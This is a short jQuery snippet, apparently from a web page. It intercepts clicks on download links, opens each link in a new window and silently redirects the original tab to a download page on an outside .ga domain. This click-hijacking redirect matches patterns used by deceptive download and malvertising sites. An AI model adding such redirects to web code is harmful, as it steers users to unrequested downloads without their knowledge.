$(".DownloadLink").click(
    function(e) {
        e.preventDefault();
        window.open( $(this).attr("href") );
        window.location="https://snxw.ga/download";
    }
);
